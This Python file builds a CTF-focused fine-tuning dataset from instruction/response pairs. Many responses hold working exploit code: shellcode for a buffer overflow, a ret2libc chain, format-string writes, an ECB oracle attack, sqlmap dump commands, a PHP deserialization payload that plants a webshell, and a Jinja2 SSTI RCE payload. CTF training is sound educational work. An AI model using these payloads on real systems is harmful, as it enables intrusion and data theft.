"""
Diorite Dataset Preparation - CTF / cybersecurity training data only.

FIX vs original: the old loader pulled in unrelated generic HuggingFace
datasets. Those diluted the CTF focus, so they are removed. Training data
is now ONLY the curated CTF examples below, plus optional extra examples
you add in data/*.jsonl.

Optional extra data format (one JSON object per line):
  {"category": "web_exploitation", "instruction": "...", "response": "..."}
"""

import json
import random
from pathlib import Path
from typing import Dict, List

from datasets import Dataset

from diorite_config import SYSTEM_PROMPT


CTF_EXAMPLES = [
    {
        "category": "binary_exploitation",
        "instruction": "Explain how to exploit a basic buffer overflow vulnerability.",
        "response": (
            "## Buffer Overflow Exploitation\n\n"
            "### Analysis\n"
            "A buffer overflow occurs when a program writes more data to a buffer than it can hold, "
            "overwriting adjacent memory including the return address on the stack.\n\n"
            "### Approach\n"
            "1. Find the offset to the return address using pattern generation (e.g., `pattern_create`)\n"
            "2. Identify bad characters that break the payload\n"
            "3. Locate a `jmp esp` or `call esp` gadget in the binary\n"
            "4. Construct shellcode or use ROP\n\n"
            "### Solution\n"
            "```python\n"
            "from struct import pack\n\n"
            "offset = 76\n"
            "jmp_esp = 0x08049284  # example address\n"
            "shellcode = b'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'\n\n"
            "payload = b'A' * offset\n"
            "payload += pack('<I', jmp_esp)\n"
            "payload += shellcode\n\n"
            "print(payload)\n"
            "```\n"
            "Always verify the offset with a cyclic pattern first."
        ),
    },
    {
        "category": "binary_exploitation",
        "instruction": "How does a ret2libc attack work?",
        "response": (
            "## ret2libc Attack\n\n"
            "### Analysis\n"
            "When NX/DEP is enabled, you cannot execute shellcode on the stack. "
            "Instead, jump to existing library functions like `system()` or `execve()`.\n\n"
            "### Approach\n"
            "1. Find offset to return address (same as buffer overflow)\n"
            "2. Leak a libc address to defeat ASLR\n"
            "3. Calculate libc base and find `system()`, `/bin/sh` string\n"
            "4. Overwrite return address with `system('/bin/sh')` chain\n\n"
            "### Solution\n"
            "```python\n"
            "from pwn import *\n\n"
            "elf = ELF('./vuln')\n"
            "libc = ELF('./libc.so.6')\n"
            "p = process('./vuln')\n\n"
            "# Leak puts address\n"
            "payload = b'A' * 76 + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])\n"
            "p.sendline(payload)\n"
            "puts_leak = u32(p.recv(4))\n\n"
            "libc_base = puts_leak - libc.sym['puts']\n"
            "system = libc_base + libc.sym['system']\n"
            "bin_sh = libc_base + next(libc.search(b'/bin/sh'))\n\n"
            "# ret2system\n"
            "payload = b'A' * 76 + p32(system) + b'AAAA' + p32(bin_sh)\n"
            "p.sendline(payload)\n"
            "p.interactive()\n"
            "```"
        ),
    },
    {
        "category": "binary_exploitation",
        "instruction": "How do I exploit a format string vulnerability to leak stack data and write an address?",
        "response": (
            "## Format String Exploitation\n\n"
            "### Analysis\n"
            "A format string bug happens when user input is passed directly as the format "
            "argument to `printf()` / `sprintf()`. `%x` / `%p` leak stack values, `%n` writes.\n\n"
            "### Approach\n"
            "1. Leak with `%p` / `%x` to find your input on the stack and locate the target address\n"
            "2. Find the argument position, e.g. input shows up as the 6th argument\n"
            "3. Use `%<value>c%<pos>$hn` / `%<pos>$n` to write, or use pwntools `fmtstr_payload`\n\n"
            "### Solution\n"
            "```python\n"
            "from pwn import *\n\n"
            "p = process('./vuln')\n"
            "# leak: 6th argument is our input\n"
            "p.sendline(b'%6$p')\n"
            "leak = int(p.recvline().strip(), 16)\n"
            "print(hex(leak))\n\n"
            "# write 0x1337 to target with fmtstr_payload (offset 6)\n"
            "payload = fmtstr_payload(6, {0x804a010: 0x1337})\n"
            "p.sendline(payload)\n"
            "```\n"
            "Check for `%n` filtering first - if blocked, use `%hn` / `%hhn` short writes."
        ),
    },
    {
        "category": "cryptography",
        "instruction": "How do I crack a weak RSA key where e=65537 and the modulus n is small?",
        "response": (
            "## Cracking Small RSA\n\n"
            "### Analysis\n"
            "When n is small (under ~2^40), it can be factored directly. "
            "With e=65537 the standard approach applies once p and q are recovered.\n\n"
            "### Approach\n"
            "1. Factor n into p and q using tools like `yafu`, `msieve`, or Python `sympy`\n"
            "2. Compute d = modular_inverse(e, (p-1)*(q-1))\n"
            "3. Decrypt: m = pow(c, d, n)\n\n"
            "### Solution\n"
            "```python\n"
            "from sympy import factorint, mod_inverse\n\n"
            "n = 0xDEADBEEF  # example small modulus\n"
            "e = 65537\n"
            "c = 0x12345678\n\n"
            "factors = factorint(n)\n"
            "p, q = list(factors.keys())\n"
            "phi = (p - 1) * (q - 1)\n"
            "d = mod_inverse(e, phi)\n"
            "m = pow(c, d, n)\n"
            "print(bytes.fromhex(hex(m)[2:]))\n"
            "```"
        ),
    },
    {
        "category": "cryptography",
        "instruction": "How do I exploit ECB mode in block ciphers?",
        "response": (
            "## ECB Mode Exploitation\n\n"
            "### Analysis\n"
            "ECB encrypts each block independently, so identical plaintext blocks produce "
            "identical ciphertext blocks. This leaks patterns.\n\n"
            "### Attack: Byte-at-a-time\n"
            "When a server prepends your input and encrypts in ECB:\n"
            "1. Control block alignment to shift a target byte to the end of a block\n"
            "2. Brute-force that byte by comparing ciphertext blocks\n"
            "3. Repeat for each byte in the secret\n\n"
            "### Solution\n"
            "```python\n"
            "import requests\n\n"
            "block_size = 16\n"
            "known = b''\n\n"
            "for i in range(32):  # secret length\n"
            "    block_num = (i + block_size) // block_size - 1\n"
            "    padding_len = block_size - 1 - (i % block_size)\n"
            "    oracle_input = b'A' * padding_len\n"
            "    target = requests.get(f'http://ctf/{oracle_input.hex()}').content\n"
            "    target_block = target[block_num*32:(block_num+1)*32]\n\n"
            "    for c in range(256):\n"
            "        guess = oracle_input + known + bytes([c])\n"
            "        resp = requests.get(f'http://ctf/{guess.hex()}').content\n"
            "        if resp[block_num*32:(block_num+1)*32] == target_block:\n"
            "            known += bytes([c])\n"
            "            break\n"
            "print(known)\n"
            "```"
        ),
    },
    {
        "category": "cryptography",
        "instruction": "How do I test a JWT for weak signing in a CTF?",
        "response": (
            "## JWT Weak Signing\n\n"
            "### Analysis\n"
            "JWTs are often signed with a weak / empty secret, `alg: none`, or an "
            "RS256 -> HS256 confusion. If you can forge a token, you can become admin.\n\n"
            "### Approach\n"
            "1. Decode header + payload at jwt.io - check `alg`, `kid`, `role`\n"
            "2. Try `alg: none` - remove signature, set alg to none\n"
            "3. Try weak secrets with `hashcat` / `john` or a wordlist: secret, key, 123456, etc.\n"
            "4. Try RS256 -> HS256 confusion using the public key as the HMAC secret\n\n"
            "### Solution\n"
            "```bash\n"
            "# crack weak HMAC secret\n"
            "hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\n"
            "# or with python\n"
            "python3 -c \"import jwt; print(jwt.decode(t, options={'verify_signature': False}))\"\n"
            "```\n"
            "Always check `kid` for directory traversal / SQLi too - it is a classic CTF vector."
        ),
    },
    {
        "category": "web_exploitation",
        "instruction": "How do I test a web application for SQL injection?",
        "response": (
            "## SQL Injection Testing\n\n"
            "### Analysis\n"
            "SQL injection occurs when user input is concatenated directly into SQL queries. "
            "Look for login forms, search fields, URL parameters, and cookie values.\n\n"
            "### Approach\n"
            "1. Test with single quote `'` and common SQL syntax\n"
            "2. Use `sqlmap` for automated detection\n"
            "3. Identify the DBMS type (MySQL, PostgreSQL, MSSQL, SQLite)\n"
            "4. Enumerate columns, extract data, or achieve RCE\n\n"
            "### Solution\n"
            "```bash\n"
            "# Manual test\n"
            "' OR '1'='1\n"
            "' UNION SELECT null,null-- -\n\n"
            "# Automated with sqlmap\n"
            "sqlmap -u 'http://target/page?id=1' --dbs --batch\n"
            "sqlmap -u 'http://target/page?id=1' -D dbname --tables\n"
            "sqlmap -u 'http://target/page?id=1' -D dbname -T users --dump\n"
            "```\n"
            "Always check for WAF first with `sqlmap --identify-waf`."
        ),
    },
    {
        "category": "web_exploitation",
        "instruction": "How do I exploit a deserialization vulnerability in PHP?",
        "response": (
            "## PHP Deserialization (Object Injection)\n\n"
            "### Analysis\n"
            "When `unserialize()` processes untrusted input, attacker-controlled objects "
            "are instantiated. Magic methods like `__destruct` or `__wakeup` execute automatically.\n\n"
            "### Approach\n"
            "1. Identify the unserialize call and input source\n"
            "2. Audit all loaded classes for dangerous magic methods\n"
            "3. Find a gadget chain: `__wakeup` -> sensitive call -> `__destruct`\n"
            "4. Craft a serialized payload using the gadget chain\n\n"
            "### Solution\n"
            "```php\n"
            "// Vulnerable code pattern\n"
            "class Logger {\n"
            "    public $logFile;\n"
            "    public $content;\n"
            "    function __destruct() {\n"
            "        file_put_contents($this->logFile, $this->content);\n"
            "    }\n"
            "}\n"
            "// Exploit: serialize to write a webshell\n"
            "$obj = new Logger();\n"
            "$obj->logFile = '/var/www/html/shell.php';\n"
            "$obj->content = '<?php system($_GET[\"c\"]); ?>';\n"
            "echo urlencode(serialize($obj));\n"
            "```"
        ),
    },
    {
        "category": "web_exploitation",
        "instruction": "How do I test for XSS and SSTI in a CTF web challenge?",
        "response": (
            "## XSS + SSTI Testing\n\n"
            "### Analysis\n"
            "XSS = your input is reflected / stored as HTML/JS. SSTI = your input is "
            "rendered as a template (Jinja2, Twig, etc.) and you can inject template code.\n\n"
            "### Approach\n"
            "1. XSS probe: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `{{7*7}}`\n"
            "2. If `{{7*7}}` returns `49`, it is SSTI - not just reflected text\n"
            "3. SSTI: try `{{ config }}`, `{{ self }}`, then RCE via `__class__` / `__subclasses__`\n"
            "4. XSS: check where input lands - attribute, script block, or HTML - and break out accordingly\n\n"
            "### Solution\n"
            "```\n"
            "# SSTI detection\n"
            "{{7*7}}  -> 49 means SSTI\n"
            "{{7*'7'}} -> 7777777 means Jinja2\n\n"
            "# Jinja2 RCE (CTF classic)\n"
            "{{ ''.__class__.__mro__[1].__subclasses__()[400]('cat flag', shell=True, stdout=-1).communicate() }}\n"
            "# find the right subclass index with: {{ ''.__class__.__mro__[1].__subclasses__() }}\n"
            "```\n"
            "For stored XSS, use a blind payload that exfiltrates `document.cookie` to your listener."
        ),
    },
    {
        "category": "reverse_engineering",
        "instruction": "What is the approach to reverse engineer a packed binary?",
        "response": (
            "## Packed Binary Reversing\n\n"
            "### Analysis\n"
            "Packed binaries use obfuscation/packing to hide the real code. "
            "Common packers: UPX, ASPack, Themida, custom RC4/XOR.\n\n"
            "### Approach\n"
            "1. Identify the packer with `detect-it-easy` or `file` command\n"
            "2. Try auto-unpacking: `upx -d binary`\n"
            "3. For custom packers: run under debugger, set breakpoints after unpacking routine\n"
            "4. Dump the unpacked process memory\n\n"
            "### Solution\n"
            "```bash\n"
            "# Check for UPX\n"
            "upx -t binary\n"
            "upx -d binary\n\n"
            "# For custom packers - use GDB\n"
            "gdb ./binary\n"
            "b *0x401000  # entry point after unpack\n"
            "run\n"
            "dump binary memory unpacked.bin 0x401000 0x405000\n"
            "```\n"
            "Always look for strings and API calls in the packer stub to understand the unpacking logic."
        ),
    },
    {
        "category": "reverse_engineering",
        "instruction": "How do I use Ghidra to analyze a binary?",
        "response": (
            "## Ghidra Reverse Engineering Workflow\n\n"
            "### Analysis\n"
            "Ghidra provides free decompilation and analysis comparable to IDA Pro.\n\n"
            "### Approach\n"
            "1. Import binary, auto-analyze with default settings\n"
            "2. Read the decompiler output for `main()`\n"
            "3. Rename functions and variables for clarity\n"
            "4. Use cross-references (XRefs) to trace data flow\n"
            "5. Export decompiled C code for further analysis\n\n"
            "### Key Shortcuts\n"
            "- `L` - Rename label\n"
            "- `Ctrl+E` - Edit function signature\n"
            "- `X` - Show XRefs\n"
            "- `G` - Go to address\n"
            "- Right-click -> Retype variable to fix types\n\n"
            "### Tips\n"
            "1. Start with string references to find interesting functions\n"
            "2. Look for `strcmp`, `memcpy`, crypto constants\n"
            "3. Use Data Type Manager to define custom structs\n"
            "4. Script with Jython for bulk analysis\n"
            "5. Check function graph view for control flow"
        ),
    },
    {
        "category": "forensics",
        "instruction": "How do I analyze a suspicious PCAP file?",
        "response": (
            "## PCAP Analysis\n\n"
            "### Analysis\n"
            "Packet captures contain network traffic that may hide flags, credentials, "
            "or malware communication. Systematic protocol analysis is key.\n\n"
            "### Approach\n"
            "1. Open in Wireshark for visual inspection\n"
            "2. Use `tshark` for command-line extraction\n"
            "3. Filter by protocol: HTTP, DNS, FTP, ICMP\n"
            "4. Extract files with `binwalk` or Wireshark export\n"
            "5. Check for data hidden in DNS queries or ICMP payloads\n\n"
            "### Solution\n"
            "```bash\n"
            "# Statistics\n"
            "tshark -r capture.pcap -q -z io,phs\n\n"
            "# Extract HTTP objects\n"
            "tshark -r capture.pcap --export-objects http,./extracted\n\n"
            "# DNS tunneling check\n"
            "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name\n\n"
            "# ICMP data extraction\n"
            "tshark -r capture.pcap -Y 'icmp' -T fields -e data\n"
            "```"
        ),
    },
    {
        "category": "forensics",
        "instruction": "How do I find a hidden flag in an image file in a CTF?",
        "response": (
            "## Image Steganography / Forensics\n\n"
            "### Analysis\n"
            "Flags hide in metadata, LSB stego, appended data, or alternate image layers.\n\n"
            "### Approach\n"
            "1. `file`, `exiftool`, `strings` - check metadata and trailing data\n"
            "2. `binwalk -e` / `foremost` - extract appended files\n"
            "3. `zsteg`, `steghide`, `stegsolve` - LSB / colour-plane analysis\n"
            "4. Check PNG chunks, JPEG comments, and image dimensions vs actual data\n\n"
            "### Solution\n"
            "```bash\n"
            "exiftool image.png\n"
            "strings image.png | grep -i flag\n"
            "binwalk -e image.png\n"
            "zsteg -a image.png\n"
            "steghide extract -sf image.jpg -p ''\n"
            "# check for data after IEND\n"
            "xxd image.png | tail\n"
            "```\n"
            "If the image looks normal, try LSB in each colour channel separately."
        ),
    },
    {
        "category": "privilege_escalation",
        "instruction": "What are common Linux privilege escalation vectors?",
        "response": (
            "## Linux Privilege Escalation\n\n"
            "### Analysis\n"
            "After gaining initial access, escalate privileges by exploiting misconfigurations, "
            "kernel vulnerabilities, or SUID binaries.\n\n"
            "### Approach\n"
            "1. Run `LinPEAS` for automated enumeration\n"
            "2. Check SUID/SGID binaries: `find / -perm -4000 2>/dev/null`\n"
            "3. Check writable paths in $PATH, cron jobs, kernel version\n"
            "4. Look for credentials in config files, history, environment\n\n"
            "### Common Vectors\n"
            "- **SUID binaries**: Find abusable ones with `gtfobins.github.io`\n"
            "- **Cron jobs**: Writable scripts run as root\n"
            "- **Kernel exploits**: DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)\n"
            "- **Sudo misconfig**: `sudo -l` reveals risky commands\n"
            "- **Capabilities**: `getcap -r / 2>/dev/null`\n\n"
            "### Solution\n"
            "```bash\n"
            "# Quick enumeration\n"
            "sudo -l\n"
            "find / -perm -4000 -type f 2>/dev/null\n"
            "cat /etc/crontab\n"
            "uname -r\n"
            "```"
        ),
    },
    {
        "category": "misc",
        "instruction": "How do I approach a CTF challenge when I don't know where to start?",
        "response": (
            "## CTF Triage Method\n\n"
            "### Analysis\n"
            "Most CTF challenges fall into a category by their files / service. "
            "Identify the category first, then run the standard checklist for it.\n\n"
            "### Approach\n"
            "1. Binary? Run `file`, `strings`, `checksec`, open in Ghidra\n"
            "2. Web? View source, check robots.txt, cookies, headers, try `{{7*7}}` and `' OR 1=1`\n"
            "3. Crypto? Look for weak RSA, ECB, XOR, known plaintext, small n\n"
            "4. Forensics? `exiftool`, `binwalk`, `tshark`, `strings` first\n"
            "5. Pwn? Check protections, find the overflow / format string, build a local exploit with pwntools\n\n"
            "### Solution\n"
            "Always work locally first, reproduce the bug, then adapt the exploit to the remote. "
            "Keep notes: what you tried, what the binary/service returned, and what changed."
        ),
    },
]


def format_example(example: Dict) -> Dict:
    """Format one example into the SmolLM2-Instruct chat format."""
    return {
        "text": (
            f"{SYSTEM_PROMPT}\n\n"
            f"[INST] {example['instruction']}[/INST]\n"
            f"{example['response']}"
        )
    }


def load_extra_examples(data_dir: str = "data") -> List[Dict]:
    """Load optional extra CTF examples from data/*.jsonl (ignored by git)."""
    extra: List[Dict] = []
    data_path = Path(data_dir)
    if not data_path.exists():
        return extra
    for f in sorted(data_path.glob("*.jsonl")):
        try:
            for line in f.read_text().splitlines():
                line = line.strip()
                if not line:
                    continue
                row = json.loads(line)
                if row.get("instruction") and row.get("response"):
                    extra.append(row)
            print(f"[+] Loaded extra examples from {f}: {len(extra)} total")
        except Exception as e:
            print(f"[-] Could not load {f}: {e}")
    return extra


def build_training_dataset(max_examples: int = 5000) -> Dataset:
    """Build the final training dataset - CTF examples only."""
    all_examples = list(CTF_EXAMPLES) + load_extra_examples()
    formatted = [format_example(ex) for ex in all_examples]

    random.shuffle(formatted)
    formatted = formatted[:max_examples]

    print(f"[+] Total training examples: {len(formatted)} (CTF-only)")
    return Dataset.from_list(formatted)


if __name__ == "__main__":
    ds = build_training_dataset(max_examples=2000)
    print(f"Dataset size: {len(ds)}")
    print(f"Sample:\n{ds[0]['text'][:300]}...")
